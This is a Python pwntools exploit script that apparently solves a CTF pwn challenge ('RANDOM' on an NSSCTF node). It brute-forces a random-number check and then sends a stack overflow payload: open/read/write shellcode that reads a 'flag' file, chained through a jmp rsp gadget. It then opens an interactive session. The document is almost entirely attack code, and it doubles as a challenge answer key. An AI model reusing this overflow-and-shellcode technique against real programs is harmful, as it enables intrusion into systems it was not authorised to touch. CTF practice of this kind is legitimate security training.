from pwn import *
import random
context.log_level = 'debug'
context(os = 'linux', arch = 'amd64')
io = process("./RANDOM")
io = remote('node1.anna.nssctf.cn', 28351)
elf = ELF("./RANDOM")
io.recvline()
while True:
	i = random.randint(0,49)
	#print i
	io.sendline(str(i))

	data = io.recvline()
	#print data
	#sleep(0.1)
	if 'good' in data:
		print 'over over'
		break

jmp_rsp = 0x40094a

sc3 = '''
	sub rsp, 0x100
	jmp $-55
'''

open_sc = '''
	push 0x67616c66
	mov rdi, rsp
	syscall
'''

read_sc = '''
	mov rdi, rax
	xor eax, eax
	mov dh, 0x100 >> 8
	mov rsi, rsp
	syscall
'''

write_sc = '''
	mov al, 1
	mov dil, 1
	mov dh, 0x100 >> 8
	syscall
'''

slices = '''
	push 2
	pop rax
	xor esi, esi
	xor edx, edx
'''

payload  = asm(open_sc) + asm(read_sc) + asm(write_sc)
payload  = payload.ljust(31, '\x90') + asm(slices).rjust(9, '\x90') + p64(jmp_rsp)
payload += asm(sc3)

print len(payload)


io.sendafter('door', payload)

print io.recvuntil('flag')
pause()
io.interactive()